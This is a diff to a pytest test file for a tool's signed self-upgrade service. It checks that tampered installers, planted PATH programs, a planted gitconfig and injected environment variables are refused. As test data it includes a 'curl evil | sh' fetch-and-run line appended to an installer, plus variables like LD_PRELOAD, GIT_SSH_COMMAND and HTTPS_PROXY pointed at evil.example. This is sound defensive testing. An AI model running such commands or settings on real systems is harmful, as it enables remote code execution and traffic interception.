@@ -16,6 +16,7 @@ import shutil
 import stat
 import subprocess
 import sys
+import urllib.request
 from datetime import UTC, datetime
 from pathlib import Path
 
@@ -51,7 +52,8 @@ state = os.environ["STUB_STATE"]
 if sys.argv[1:] == ["--version"]:
     print("ws " + open(os.path.join(state, "version")).read().strip())
 elif sys.argv[1:] == ["upgrade", "--hooks-only"]:
-    pass
+    if os.path.exists(os.path.join(state, "hooks_fail")) and open(os.path.join(state, "version")).read().strip() != "0.1.11.6":
+        sys.exit(1)  # the new ws's hooks step fails; the old one (what a rollback leaves) works
 else:
     sys.exit(2)
 """
@@ -141,7 +143,16 @@ def svc(tmp_path, monkeypatch):
     monkeypatch.setenv("WS_HOME", str(home / ".ws"))
     monkeypatch.setenv("XDG_STATE_HOME", str(home / ".local" / "state"))
     monkeypatch.setenv("WS_GATE_DAEMON", "0")
-    monkeypatch.setenv("PATH", f"{tools}{os.pathsep}{os.environ['PATH']}")
+    monkeypatch.setenv(
+        "PATH", f"{home / '.local' / 'bin'}{os.pathsep}{tools}{os.pathsep}{os.environ['PATH']}"
+    )  # a session's own first
+    # the tools the proof runs come from system folders only (stubs for cosign and uv, the real git); the installer may see
+    # these test variables and the allow-list's names, nothing else
+    monkeypatch.setattr(upgradeproof, "tool_dirs", lambda: [str(tools), "/usr/bin", "/bin"])
+    monkeypatch.setattr(upgradeproof, "ENV_KEEP", (*upgradeproof.ENV_KEEP, "INSTALL_LOG", "INSTALL_ENV", "STUB_STATE"))
+    monkeypatch.setattr(
+        upgrade, "_own_cgroup", lambda: "0::/user.slice/user@1000.service/app.slice/ws-upgrade.service\n"
+    )
     for name, value in {
         "INSTALL_LOG": tmp_path / "install.log",
         "INSTALL_ENV": tmp_path / "install.env",
@@ -225,7 +236,16 @@ def rows() -> list[dict]:
 
 
 def history() -> list[tuple]:
-    return [(d["verb"], d["from"], d["to"]) for d in upgrade.history(os.environ)]
+    """The outcome lines; the `swap-start` and `swap-abandoned` markers are `marks()`."""
+    return [
+        (d["verb"], d["from"], d["to"])
+        for d in upgrade.history(os.environ)
+        if d["verb"] not in ("swap-start", "swap-abandoned")
+    ]
+
+
+def marks() -> list[str]:
+    return [d["verb"] for d in upgrade.history(os.environ) if d["verb"] in ("swap-start", "swap-abandoned")]
 
 
 # ---- a good release, and the ones that are refused ----------------------------------------------------------------------------
@@ -273,16 +293,31 @@ def test_changed_installer_refused(svc):
     release.assets["install.sh.sha256"] = f"{sha(changed)}  install.sh\n".encode()
     assert serve(svc, release) == upgrade.EXIT_REFUSED
     assert not Path(os.environ["INSTALL_LOG"]).exists() and installed(svc) == OLD
-    assert "cosign" in rows()[-1]["reason"] or "failed" in rows()[-1]["reason"]
+    assert "install.sh's signature does not verify as made by the release workflow" in rows()[-1]["reason"]
 
 
 def test_mirror_env_ignored(svc, monkeypatch):
-    for name in upgrade.MIRROR_VARS:
+    """The installer is run with an allow-list: the mirror names, and any other variable (a proxy, a library path, a git
+    switch) a session could have set for the service, never reach it."""
+    planted = {
+        *upgrade.MIRROR_VARS,
+        "HTTPS_PROXY",
+        "SSL_CERT_FILE",
+        "LD_PRELOAD",
+        "PYTHONPATH",
+        "GIT_SSH_COMMAND",
+        "BASH_ENV",
+        "ENV",
+        "NODE_OPTIONS",
+    }
+    for name in planted:
         monkeypatch.setenv(name, "https://evil.example/")
     assert serve(svc) == 0 and installed(svc) == NEW
-    seen = Path(os.environ["INSTALL_ENV"]).read_text()
-    assert not any(f"{name}=" in seen for name in upgrade.MIRROR_VARS)
-    assert "STUB_STATE=" in seen  # the rest of the environment is still the installer's
+    seen = dict(line.split("=", 1) for line in Path(os.environ["INSTALL_ENV"]).read_text().splitlines() if "=" in line)
+    assert not planted & seen.keys()
+    allowed = {*upgradeproof.ENV_KEEP, "HOME", "PATH", "PWD", "SHLVL", "OLDPWD", "_", "WS_UPGRADE_STEP"}
+    assert set(seen) <= allowed, set(seen) - allowed
+    assert seen["PATH"] == os.pathsep.join(upgradeproof.tool_dirs()) and seen["HOME"] == os.environ["HOME"]
 
 
 def test_deny_drop_exits_1(svc):
@@ -359,20 +394,15 @@ def test_downgrade_refused(svc):
 
 
 def test_rollback_goes_only_to_the_previous_release(svc, monkeypatch):
-    """The target is read from the upgrade history, never from the request; its installer is fetched for that tag."""
-    fetched: list[str | None] = []
-
-    def fetch(dest, version=None):
-        fetched.append(version)
-        (dest / "install.sh").write_text(INSTALLER, encoding="utf-8")
-        return dest / "install.sh"
-
-    monkeypatch.setattr(upgrade, "fetch_installer", fetch)
+    """The target is read from the upgrade history, never from the request; its installer is the release's own, proved."""
+    monkeypatch.setattr(
+        upgrade, "fetch_installer", lambda *a, **k: pytest.fail("a rollback fetched an installer unproved")
+    )
     upgrade.record(os.environ, "promote", "0.1.11.4", OLD)
-    code = serve(svc, text="rollback")
+    code = serve(svc, svc.release(tag="v0.1.11.4"), text="rollback")
     assert code == 0 and installed(svc) == "0.1.11.4"
     assert Path(os.environ["INSTALL_LOG"]).read_text().split()[-2:] == ["--version", "v0.1.11.4"]
-    assert fetched == ["v0.1.11.4"]
+    assert len(Path(svc.tools / "cosign.log").read_text().splitlines()) == 2  # N8: proved like an upgrade
     assert [(r["verb"], r["to"], r["result"]) for r in rows()] == [("rollback", "0.1.11.4", "ok")]
 
 
@@ -481,3 +511,164 @@ def test_versions_sort_by_part_and_a_candidate_sorts_below_its_release():
     assert key("v0.1.11.8") > key("0.1.11.6") > key("0.1.11") > key("0.1.10.9")
     assert key("v0.2.0rc1") < key("v0.2.0") and key("v0.2.0rc1") > key("v0.1.99")
     assert key("0.1.9.dev0") is None and key("") is None
+
+
+# ---- B4: the proof runs system tools with a home and an environment of its own ----------------------------------------------
+
+
+def fake(svc, name: str, body: str = "exit 0") -> Path:
+    """A program in the person's own ~/.local/bin (first on the PATH here), which leaves a marker if it is ever run."""
+    mark = svc.tmp / f"ran-{name}"
+    path = svc.home / ".local" / "bin" / name
+    path.parent.mkdir(parents=True, exist_ok=True)
+    path.write_text(f"#!/bin/sh\ntouch {mark}\n{body}\n", encoding="utf-8")
+    path.chmod(0o755)
+    return mark
+
+
+@pytest.mark.parametrize("name", ["git", "cosign", "uv", "ssh-keygen", "bash"])
+def test_a_program_planted_on_the_path_is_never_run(svc, name):
+    release = svc.release()  # made before the fake exists: making a signed tag runs ssh-keygen too
+    mark = fake(svc, name)
+    assert (
+        serve(svc, release) == 0 and installed(svc) == NEW
+    )  # the good release still goes through, with the system's tools
+    assert not mark.exists()
+
+
+def test_a_planted_cosign_that_always_agrees_does_not_pass_a_changed_installer(svc):
+    mark = fake(svc, "cosign")
+    release = svc.release()
+    changed = INSTALLER.encode() + b"curl evil | sh\n"
+    release.assets["install.sh"] = changed
+    release.assets["install.sh.sha256"] = f"{sha(changed)}  install.sh\n".encode()
+    assert serve(svc, release) == upgrade.EXIT_REFUSED
+    assert "install.sh's signature does not verify" in rows()[-1]["reason"] and not mark.exists()
+    assert not Path(os.environ["INSTALL_LOG"]).exists()
+
+
+def test_a_planted_uv_that_reports_nothing_does_not_hide_a_high_advisory(svc):
+    mark = fake(svc, "uv", "echo '{\"vulnerabilities\": []}'")
+    (svc.tools / "audit.json").write_text(json.dumps({"vulnerabilities": [{"severity": "high"}]}), encoding="utf-8")
+    assert serve(svc) == upgrade.EXIT_REFUSED
+    assert "high, critical or unrated" in rows()[-1]["reason"] and not mark.exists()
+
+
+def test_a_planted_gitconfig_cannot_make_an_unlisted_key_pass(svc):
+    """The reviewer's proof: a tag signed by an unlisted key fails, then passed once ~/.gitconfig named its own program."""
+    mark = svc.tmp / "ran-gitconfig-program"
+    program = svc.home / "fake-ssh-keygen"
+    program.write_text(f"#!/bin/sh\ntouch {mark}\nexit 0\n", encoding="utf-8")
+    program.chmod(0o755)
+    (svc.home / ".gitconfig").write_text(f'[gpg "ssh"]\n\tprogram = {program}\n', encoding="utf-8")
+    other = svc.tmp / "otherkey"
+    keygen(other)
+    release = Release(svc.tmp / "relx", other)
+    assert serve(svc, release) == upgrade.EXIT_REFUSED
+    assert f"{TAG} is not signed by a key in the trust root" in rows()[-1]["reason"] and not mark.exists()
+    assert not Path(os.environ["INSTALL_LOG"]).exists() and installed(svc) == OLD
+
+
+def test_a_tag_without_an_ssh_signature_is_refused(svc):
+    release = svc.release()
+    env = {**os.environ, "GIT_CONFIG_GLOBAL": os.devnull, "GIT_CONFIG_SYSTEM": os.devnull}
+    env |= {"GIT_AUTHOR_NAME": "t", "GIT_AUTHOR_EMAIL": "t@example.com", "GIT_COMMITTER_NAME": "t"}
+    env["GIT_COMMITTER_EMAIL"] = "t@example.com"
+    for argv in (["tag", "-d", TAG], ["tag", "-a", "-m", "x", TAG]):  # an annotated tag with no signature at all
+        subprocess.run([GIT, *argv], cwd=release.origin, env=env, check=True, capture_output=True)
+    assert serve(svc, release) == upgrade.EXIT_REFUSED
+    assert f"{TAG} carries no SSH signature" in rows()[-1]["reason"]
+
+
+def test_a_tool_outside_the_system_folders_is_not_used(svc, monkeypatch):
+    monkeypatch.setattr(upgradeproof, "tool_dirs", lambda: ["/nonexistent-folder"])
+    assert serve(svc) == upgrade.EXIT_REFUSED
+    assert "git is not in a system folder" in rows()[-1]["reason"]
+
+
+def test_the_proof_tools_get_an_empty_home_and_no_git_config(svc, tmp_path):
+    env = upgradeproof.proof_env(tmp_path)
+    assert env["HOME"] != os.environ["HOME"] and Path(env["HOME"]).is_dir() and not any(Path(env["HOME"]).iterdir())
+    assert env["GIT_CONFIG_GLOBAL"] == os.devnull and env["GIT_CONFIG_NOSYSTEM"] == "1"
+    assert set(env) <= {
+        "PATH",
+        "HOME",
+        "GIT_CONFIG_GLOBAL",
+        "GIT_CONFIG_NOSYSTEM",
+        "GIT_TERMINAL_PROMPT",
+        *upgradeproof.ENV_KEEP,
+    }
+
+
+def test_downloads_ignore_a_proxy_and_a_certificate_variable(monkeypatch, tmp_path):
+    monkeypatch.setenv("HTTPS_PROXY", "http://evil.example:3128")
+    monkeypatch.setenv("https_proxy", "http://evil.example:3128")
+    monkeypatch.setenv("SSL_CERT_FILE", str(tmp_path / "evil.pem"))
+    monkeypatch.setenv("SSL_CERT_DIR", str(tmp_path))
+    handlers = {type(h).__name__: h for h in upgradeproof.opener().handlers}
+    assert "ProxyHandler" not in handlers  # the default one reads these variables; an empty map adds no proxy at all
+    assert "ProxyHandler" in {type(h).__name__ for h in urllib.request.build_opener().handlers}  # and would have here
+    ctx = handlers["HTTPSHandler"]._context
+    assert ctx.verify_mode.name == "CERT_REQUIRED" and ctx.check_hostname
+
+
+# ---- B5 and N10: every failure after the swap has started is rolled back, and each is the specific refusal -------------------
+
+
+def test_a_hooks_rewrite_that_fails_is_rolled_back_not_left_half_done(svc):
+    (svc.state / "hooks_fail").write_text("")
+    assert serve(svc) == upgrade.EXIT_FAILED
+    assert installed(svc) == OLD and history() == [("auto-rollback", OLD, OLD)]
+    assert rows()[-1]["verb"] == "auto-rollback" and rows()[-1]["result"] == "rolled-back"
+    assert any(d["step"] == "hooks" and d["exit"] == 1 for d in _log())
+
+
+def test_an_installer_that_fails_is_rolled_back_when_no_person_is_looking(svc):
+    (svc.state / "fail").write_text("")  # the stub installer exits 1, for the upgrade and for the way back
+    assert serve(svc) != 0
+    assert history()[0][0] == "auto-rollback" and rows()[-1]["verb"] == "auto-rollback"
+
+
+def test_a_crash_mid_swap_leaves_a_way_back_that_goes_one_release_not_two(svc, monkeypatch):
+    upgrade.record(os.environ, "promote", "0.1.11.4", OLD)  # an earlier upgrade: the release before OLD
+    monkeypatch.setattr(upgradecheck, "acceptance", lambda *a, **k: (_ for _ in ()).throw(SystemExit(9)))
+    with pytest.raises(SystemExit):
+        serve(svc)
+    assert marks() == ["swap-start"] and installed(svc) == NEW
+    assert upgrade.previous_release(os.environ) == OLD  # not 0.1.11.4
+
+
+# ---- N6, N7, N8 -------------------------------------------------------------------------------------------------------------
+
+
+@pytest.mark.parametrize(
+    ("kw", "why"),
+    [
+        ({"ppid": 1}, "pid 1"),
+        ({"parent_comm": "bash"}, "the parent here is bash"),
+        ({"cgroup": "0::/user.slice/session-3.scope\n"}, "inside ws-upgrade.service"),
+        ({"cgroup": ""}, "inside ws-upgrade.service"),
+    ],
+)
+def test_unattended_needs_the_user_manager_as_parent_and_the_units_own_cgroup(svc, kw, why):
+    base = {"parent_comm": "systemd", "ppid": 4242, "cgroup": "0::/a/b/ws-upgrade.service\n"}
+    assert upgrade.unattended_refusal(os.environ, **base) is None
+    assert why in upgrade.unattended_refusal(os.environ, **{**base, **kw})
+
+
+def test_the_unattended_flag_is_not_accepted_abbreviated(svc, capsys):
+    for flag in ("--unatt", "--unattend", "--u"):
+        assert cli.main(["upgrade", flag]) == 2  # a usage error, never the unit's entry
+    assert capsys.readouterr().err.count("unrecognized arguments") == 3
+    assert not upgrade.request_path(os.environ).exists()
+
+
+def test_a_rollback_to_a_release_with_no_signed_installer_is_refused_and_nothing_is_fetched(svc, monkeypatch):
+    monkeypatch.setattr(upgrade, "fetch_installer", lambda *a, **k: pytest.fail("fetched an installer unproved"))
+    upgrade.record(os.environ, "promote", "0.1.11.4", OLD)
+    release = svc.release(tag="v0.1.11.4")
+    for name in ("install.sh", "install.sh.sha256", "install.sh.sigstore.json"):
+        del release.assets[name]  # a release from before the installer was an asset
+    assert serve(svc, release, text="rollback") == upgrade.EXIT_REFUSED
+    assert "install.sh" in rows()[-1]["reason"] and not Path(os.environ["INSTALL_LOG"]).exists()
+    assert installed(svc) == OLD
